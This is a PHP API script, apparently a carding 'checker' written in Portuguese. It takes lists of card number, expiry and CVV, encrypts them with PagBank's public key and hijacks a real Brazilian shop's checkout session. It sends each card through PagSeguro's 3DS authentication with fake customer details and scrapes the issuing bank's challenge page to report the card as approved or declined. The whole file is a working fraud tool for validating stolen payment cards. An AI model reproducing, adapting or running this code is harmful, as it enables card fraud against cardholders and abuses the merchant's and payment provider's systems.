<?php

// Handler global: garante que sempre seja retornado JSON válido
set_exception_handler(function($e) {
    if (!headers_sent()) {
        header('Content-Type: application/json');
    }
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Exceção PHP: ' . $e->getMessage()
    ]);
    exit;
});

register_shutdown_function(function() {
    $error = error_get_last();
    if ($error && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (!headers_sent()) {
            header('Content-Type: application/json');
        }
        http_response_code(500);
        echo json_encode([
            'status' => 'error',
            'message' => 'Erro fatal PHP: ' . $error['message']
        ]);
    }
});

require __DIR__ . 
'/../vendor/autoload.php';

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar as GuzzleCookieJar;

// Basic custom CurlX class to wrap Guzzle for compatibility
class CurlX {
    private $client;
    private $cookieJar;

    public function __construct(GuzzleCookieJar $cookieJar) {
        $this->cookieJar = $cookieJar;
        $this->client = new Client([
            'cookies' => $this->cookieJar,
            'allow_redirects' => true,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            ]
        ]);
    }

    public function get($url, $params = [], $headers = []) {
        try {
            $response = $this->client->get($url, ['query' => $params, 'headers' => $headers]);
            return new CurlXResponse($response);
        } catch (\Exception $e) {
            return new CurlXResponse(null, $e->getMessage());
        }
    }

    public function post($url, $body = '', $headers = []) {
        try {
            $response = $this->client->post($url, ['body' => $body, 'headers' => $headers]);
            return new CurlXResponse($response);
        } catch (\Exception $e) {
            return new CurlXResponse(null, $e->getMessage());
        }
    }
}

class CurlXResponse {
    public $body;
    public $headers;
    public $error;
    private $guzzleResponse;

    public function __construct($guzzleResponse = null, $error = null) {
        $this->guzzleResponse = $guzzleResponse;
        $this->error = $error;
        if ($guzzleResponse) {
            $this->body = (string) $guzzleResponse->getBody();
            $this->headers = $guzzleResponse->getHeaders();
        } else {
            $this->body = '';
            $this->headers = [];
        }
    }

    public function between($start, $end) {
        $startPos = strpos($this->body, $start);
        if ($startPos === false) return '';
        $startPos += strlen($start);
        $endPos = strpos($this->body, $end, $startPos);
        if ($endPos === false) return '';
        return substr($this->body, $startPos, $endPos - $startPos);
    }

    public function json() {
        return json_decode($this->body, true);
    }

    public function getHeaders() {
        return $this->headers;
    }
}

// Basic custom CookieJar class for compatibility
class CookieJar extends GuzzleCookieJar {
    public function __construct($name) {
        // Guzzle's CookieJar doesn't need a name for file storage directly
        // For Vercel, we won't persist cookies to files anyway.
        parent::__construct();
    }

    public function delete() {
        // No file to delete in a stateless Vercel environment
        // Guzzle's CookieJar clears itself on script end
    }
}

// --- Funções do script original --- //

function parseCard($lista) {
    $parts = explode('|', $lista);
    if (count($parts) < 4) {
        return false;
    }
    return [
        'cc' => trim($parts[0]),
        'mes' => trim($parts[1]),
        'ano' => trim($parts[2]),
        'ano2' => substr(trim($parts[2]), -2),
        'cvv' => trim($parts[3]),
        'full' => $lista
    ];
}

$PAGBANK_PUBLIC_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAohY3No2y7wJ3mmynx81tfeCnmd80k6c4ZiacJuLG7dP1JscTu0ivKXs5H+DClSKMIlKESm4XF4kUDvuFWqfz1c/NlzeGZ2ZA1EPByxLMyRDwxBT2aaxs6AB/VZ0NFJ2hiUrM96T86KljA/sPhGYqCAw5NAXMp4RhrYDrhw6b//DVzihiXxth/3UQC3FeRqcJhU7znwPTmkFqIjpFBUK7vTjqQ8eC/03vijL99/mn1ikLXogk4D109nO8wV3NAliW/9Ai3eslPKLH9dI/UgKlEh+qdnjo99hVr93Q3Mn4FX++tBh5UFA5q5fxV/8mSREG0aIq4Sgi6VcK0wKp6BkyqwIDAQAB';

function encryptCard($number, $month, $year, $cvv) {
    global $PAGBANK_PUBLIC_KEY;
    $pan = preg_replace('/\D/', '', $number);
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    $year = strlen($year) == 2 ? '20' . $year : $year;
    $holder = "TITULAR DO CARTAO";
    $timestamp = round(microtime(true) * 1000);
    $payload = "$pan;$cvv;$month;$year;$holder;$timestamp";
    $lines = str_split($PAGBANK_PUBLIC_KEY, 64);
    $pem = "-----BEGIN PUBLIC KEY-----\n" . implode("\n", $lines) . "\n-----END PUBLIC KEY-----";
    $publicKey = openssl_pkey_get_public($pem);
    if (!$publicKey) {
        return null;
    }
    openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    return base64_encode($encrypted);
}

function detectCardBrand($number) {
    $number = preg_replace('/\D/', '', $number);
    $patterns = [
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'jcb' => '/^(?:2131|1800|35\d{3})\d{11}$/',
        'elo' => '/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/',
        'hipercard' => '/^(606282\d{10}(\d{3})?)|(3841\d{15})$/',
        'aura' => '/^50[0-9]{14,17}$/'
    ];
    
    foreach ($patterns as $brand => $pattern) {
        if (preg_match($pattern, $number)) {
            return strtoupper($brand);
        }
    }
    return 'UNKNOWN';
}

function detectBankFromBin($bin) {
    $banks = [
        '4011' => 'ITAU', '4012' => 'ITAU', '4013' => 'ITAU', '4014' => 'ITAU', '4515' => 'ITAU', '4516' => 'ITAU', '4517' => 'ITAU', '4518' => 'ITAU',
        '4551' => 'BRADESCO', '4902' => 'BRADESCO', '4903' => 'BRADESCO', '5555' => 'BRADESCO', '5556' => 'BRADESCO',
        '5448' => 'SANTANDER', '5449' => 'SANTANDER', '4001' => 'SANTANDER', '4002' => 'SANTANDER',
        '4389' => 'BANCO_DO_BRASIL', '4390' => 'BANCO_DO_BRASIL', '5067' => 'BANCO_DO_BRASIL', '5068' => 'BANCO_DO_BRASIL',
        '4514' => 'CAIXA', '5501' => 'CAIXA', '5502' => 'CAIXA',
        '5162' => 'NUBANK', '5163' => 'NUBANK',
        '5122' => 'SICREDI', '5123' => 'SICREDI',
        '5277' => 'BTG', '5278' => 'BTG',
        '4444' => 'INTER', '5566' => 'INTER',
        '5225' => 'C6_BANK', '5226' => 'C6_BANK'
    ];
    
    $bin6 = substr($bin, 0, 6);
    $bin4 = substr($bin, 0, 4);

    foreach ($banks as $binPrefix => $bank) {
        if (strpos($binPrefix, $bin6) === 0 || strpos($binPrefix, $bin4) === 0) {
            return $bank;
        }
    }
    return 'UNKNOWN';
}

function clean_html($text) {
    if (!$text) return "";
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $text);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $text);
    
    $replacements = [
        '&nbsp;' => ' ', '&amp;' => '&', '&lt;' => '<', '&gt;' => '>',
        '&quot;' => '"', '&apos;' => "'", '&hellip;' => '...',
        '&aacute;' => 'á', '&Aacute;' => 'Á', '&agrave;' => 'à', '&Agrave;' => 'À',
        '&acirc;' => 'â', '&Acirc;' => 'Â', '&atilde;' => 'ã', '&Atilde;' => 'Ã',
        '&eacute;' => 'é', '&Eacute;' => 'É', '&egrave;' => 'è', '&Egrave;' => 'È',
        '&ecirc;' => 'ê', '&Ecirc;' => 'Ê', '&iacute;' => 'í', '&Iacute;' => 'Í',
        '&igrave;' => 'ì', '&Igrave;' => 'Ì', '&icirc;' => 'î', '&Icirc;' => 'Î',
        '&oacute;' => 'ó', '&Oacute;' => 'Ó', '&ograve;' => 'ò', '&Ograve;' => 'Ò',
        '&ocirc;' => 'ô', '&Ocirc;' => 'Ô', '&otilde;' => 'õ', '&Otilde;' => 'Õ',
        '&uacute;' => 'ú', '&Uacute;' => 'Ú', '&ugrave;' => 'ù', '&Ugrave;' => 'Ù',
        '&ucirc;' => 'û', '&Ucirc;' => 'Û', '&ccedil;' => 'ç', '&Ccedil;' => 'Ç',
        '&#225;' => 'á', '&#224;' => 'à', '&#226;' => 'â', '&#227;' => 'ã',
        '&#233;' => 'é', '&#232;' => 'è', '&#234;' => 'ê', '&#237;' => 'í',
        '&#236;' => 'ì', '&#238;' => 'î', '&#243;' => 'ó', '&#242;' => 'ò',
        '&#244;' => 'ô', '&#245;' => 'õ', '&#250;' => 'ú', '&#249;' => 'ù',
        '&#251;' => 'û', '&#231;' => 'ç'
    ];
    
    $text = strtr($text, $replacements);
    $text = preg_replace('/<br\s*\/?>/i', "\n", $text);
    $text = preg_replace('/<[^>]*>/', ' ', $text);
    $text = preg_replace('/\s+/', ' ', $text);
    
    $text = preg_replace('/Estabelecimento:\s*Sandro Gonçalves de Jesus/i', '', $text);
    $text = preg_replace('/Estabelecimento:\s*FABIO DE MORAIS DANTAS/i', '', $text);
    
    return trim($text);
}

function extractBankFields($html) {
    $patterns = [
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>/is',
        '/<div class="challengeInfoText">(.*?)<\/div>/is',
        '/<div class="container_body_text">(.*?)<\/div>/is',
        '/<div id="info_message_auth">(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*mensagem[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*texto[^"]*"[^>]*>(.*?)<\/p>/is',
        '/id="textoMensagem"[^>]*>(.*?)<\/[^>]+>/is',
        '/<span[^>]*id="[^"]*mensagem[^"]*"[^>]*>(.*?)<\/span>/is',
        '/<div[^>]*class="[^"]*content[^"]*"[^>]*>(.*?)<\/div>/is',
        '/class="bradesco-message"[^>]*>(.*?)<\/[^>]+>/is',
        '/<div[^>]*class="[^"]*santander[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*id="[^"]*content[^"]*"[^>]*>(.*?)<\/p>/is',
        '/id="mainContent"[^>]*>(.*?)<\/[^>]+>/is',
        '/<div[^>]*class="[^"]*sicredi[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<span[^>]*class="[^"]*info[^"]*"[^>]*>(.*?)<\/span>/is',
        '/class="message-container"[^>]*>(.*?)<\/[^>]+>/is',
        '/<div[^>]*class="[^"]*nu[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*purple[^"]*"[^>]*>(.*?)<\/p>/is',
        '/<div[^>]*class="[^"]*bb[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<span[^>]*id="[^"]*bb[^"]*"[^>]*>(.*?)<\/span>/is',
        '/<div[^>]*class="[^"]*caixa[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*azul[^"]*"[^>]*>(.*?)<\/p>/is',
        '/<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*success[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*warning[^"]*"[^>]*>(.*?)<\/div>/is',
        '/(?:Nome|name):\s*([^<,\n]+)/i',
        '/(?:Para|To)\s+([^,<\n]+),/i',
        '/<div id="info_message_auth">.*?<p>\s*([^,]*),/s',
        '/<label[^>]*>(Chave titular Ref final \d+)<\/label>/i',
        '/<span[^>]*id=["\\]'contentBlock-text["\\]'][^>]*>(\+?\d+)<\/span>/i',
        '/id="CredentialId-0a-label">(.*?)<\/label>/is',
        '/<label[^>]*for="[^"]*credential[^"]*"[^>]*>(.*?)<\/label>/is',
        '/<div[^>]*id="[^"]*main[^"]*"[^>]*>.*?<\/div>/is',
        '/<div[^>]*class="[^"]*main[^"]*"[^>]*>.*?<\/div>/is',
        '/<body[^>]*>(.*?)<\/body>/is'
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $html, $match)) {
            $text = clean_html($match[1]);
            if (!empty($text) && strlen($text) > 3) {
                return $text;
            }
        }
    }
    
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $html);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $html);
    $text = strip_tags($text);
    $text = preg_replace('/\s+/', ' ', $text);
    $text = trim($text);
    
    if (strlen($text) > 10) {
        return substr($text, 0, 200) . (strlen($text) > 200 ? '...' : '');
    }
    
    return "mensagem vbv não capturada";
}

function analyzeVbvMessage($message) {
    $message_lower = strtolower($message);
    
    $approval_keywords = [
        'aprovada', 'sucesso', 'autorizada', 'confirmada', 'concluida',
        'success', 'approved', 'authorized', 'confirmed', 'completed',
        'para concluir', 'acesse seu aplicativo', 'confirme a transação',
        'transação autorizada', 'compra aprovada'
    ];
    
    $decline_keywords = [
        'negada', 'recusada', 'reprovada', 'rejeitada', 'cancelada',
        'declined', 'denied', 'rejected', 'failed', 'error',
        'cartão inválido', 'dados incorretos', 'transação negada',
        'compra não autorizada', 'limite insuficiente', 'cartão bloqueado',
        'senha incorreta', 'falha na autenticação'
    ];
    
    foreach ($approval_keywords as $keyword) {
        if (strpos($message_lower, $keyword) !== false) {
            return 'APPROVED';
        }
    }
    
    foreach ($decline_keywords as $keyword) {
        if (strpos($message_lower, $keyword) !== false) {
            return 'DECLINED';
        }
    }
    
    return 'UNKNOWN';
}

// --- Lógica principal da API --- //

header('Content-Type: application/json');

try {

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Método não permitido.']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$lista = $input['lista'] ?? null;

if (!$lista) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Parâmetro "lista" ausente ou inválido.']);
    exit;
}

$time_start = microtime(true);

$card = parseCard($lista);
if (!$card) {
    echo json_encode(['status' => 'declined', 'message' => 'Lista inválida!', 'brand' => 'UNKNOWN', 'bank' => 'UNKNOWN', 'time' => (microtime(true) - $time_start) . 's']);
    exit;
}

$cc = $card['cc'];
$mes = $card['mes'];
$ano = $card['ano'];
$ano2 = $card['ano2'];
$cvv = $card['cvv'];
$full_lista = $card['full'];

$detected_brand = detectCardBrand($cc);
$detected_bank = detectBankFromBin($cc);

$card_info = "[$detected_brand - $detected_bank]";

$cookie = new CookieJar('vbv');
$CurlX = new CurlX($cookie);

$encrypted_hash = encryptCard($cc, $mes, $ano2, $cvv);

if (!$encrypted_hash) {
    echo json_encode(['status' => 'declined', 'message' => 'Erro na criptografia', 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => (microtime(true) - $time_start) . 's']);
    exit;
}

// Step 1: Add to cart
$add_to_cart_url = 'https://conteudoemais.com.br/finalizar-compra/?add-to-cart=30157';
$add_response = $CurlX->get($add_to_cart_url);

if ($add_response->error) {
    echo json_encode(['status' => 'declined', 'message' => 'Erro ao adicionar ao carrinho: ' . $add_response->error, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => (microtime(true) - $time_start) . 's']);
    exit;
}

// Step 2: Get checkout page and PagSeguro session
$checkout_url = 'https://conteudoemais.com.br/finalizar-compra/';
$checkout_response = $CurlX->get($checkout_url);

if ($checkout_response->error) {
    echo json_encode(['status' => 'declined', 'message' => 'Erro ao obter página de checkout: ' . $checkout_response->error, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => (microtime(true) - $time_start) . 's']);
    exit;
}

$ps_session = $checkout_response->between("var pagseguro_connect_3d_session = '", "'");

if (empty($ps_session)) {
    echo json_encode(['status' => 'declined', 'message' => 'Erro ao capturar o session 3d', 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => (microtime(true) - $time_start) . 's']);
    exit();
}

$headers = [
    'Content-Type' => 'application/json',
    'Authorization' => $ps_session
];

$post_body = [
    "paymentMethod" => [
        "type" => "CREDIT_CARD",
        "installments" => 1,
        "card" => [
            "encrypted" => $encrypted_hash
        ]
    ],
    "dataOnly" => false,
    "customer" => [
        "name" => "Nocyam Solo",
        "email" => "geudgziwb@gmail.com",
        "phones" => [["country" => "55", "area" => "14", "number" => "998543793", "type" => "MOBILE"]]
    ],
    "amount" => [
        "value" => 999,
        "currency" => "BRL"
    ],
    "billingAddress" => [
        "street" => "Rua Conde de Baependi, 14",
        "number" => "n/d",
        "complement" => "n/d",
        "regionCode" => "SP",
        "country" => "BRA",
        "city" => "Rio de janeiro",
        "postalCode" => "22231140"
    ],
    "deviceInformation" => [
        "httpBrowserColorDepth" => 24,
        "httpBrowserJavaEnabled" => false,
        "httpBrowserJavaScriptEnabled" => true,
        "httpBrowserLanguage" => "pt-BR",
        "httpBrowserScreenHeight" => 412,
        "httpBrowserScreenWidth" => 915,
        "httpBrowserTimeDifference" => 180,
        "httpDeviceChannel" => "Browser",
        "userAgentBrowserValue" => "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    ]
];

$auth_response = $CurlX->post('https://sdk.pagseguro.com/checkout-sdk/3ds/authentications', json_encode($post_body), $headers);
$data = $auth_response->json();
$three_ds_id = $data['id'] ?? '';

if (!$three_ds_id) {
    $status_message = $data['status'] ?? ($data['message'] ?? 'Falha na autenticação');
    echo json_encode(['status' => 'declined', 'message' => $status_message, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => (microtime(true) - $time_start) . 's']);
    exit();
}

$confirm_response = $CurlX->post('https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/' . $three_ds_id, '', $headers);
$confirm_data = $confirm_response->json();
$tempo = (microtime(true) - $time_start);

if (isset($confirm_data['status']) && $confirm_data['status'] === 'SUCCESS') {
    echo json_encode(['status' => 'approved', 'message' => 'Transação aprovada', 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => $tempo . 's']);
} elseif (isset($confirm_data['status']) && $confirm_data['status'] === 'REQUIRE_CHALLENGE') {
    $challenge = $confirm_data['challenge'] ?? [];
    $acs_url = $challenge['acsUrl'] ?? '';
    $creq = $challenge['payload'] ?? '';

    if ($acs_url && $creq) {
        $challenge_response = $CurlX->post($acs_url, 'creq=' . $creq, ['Content-Type' => 'application/x-www-form-urlencoded']);
        $message = extractBankFields($challenge_response->body);
        $analysis = analyzeVbvMessage($message);
        
        if ($analysis === 'DECLINED' || 
            strpos(strtolower($message), 'compra não concluída') !== false || 
            strpos(strtolower($message), 'reprovada') !== false || 
            strpos(strtolower($message), 'inválido') !== false) {
            echo json_encode(['status' => 'declined', 'message' => $message, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => $tempo . 's']);
        } else {
            echo json_encode(['status' => 'approved', 'message' => $message, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => $tempo . 's']);
        }
    } else {
        echo json_encode(['status' => 'declined', 'message' => 'Desafio 3DS requerido, mas ACS URL ou CReq ausentes.', 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => $tempo . 's']);
    }
} else {
    $status_message = $confirm_data['status'] ?? 'DECLINED';
    $message = $confirm_data['message'] ?? 'Status desconhecido ou reprovado.';
    echo json_encode(['status' => 'declined', 'message' => $message, 'brand' => $detected_brand, 'bank' => $detected_bank, 'time' => $tempo . 's']);
}

    $cookie->delete();

} catch (\Throwable $e) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Erro interno: ' . $e->getMessage()
    ]);
}
?>
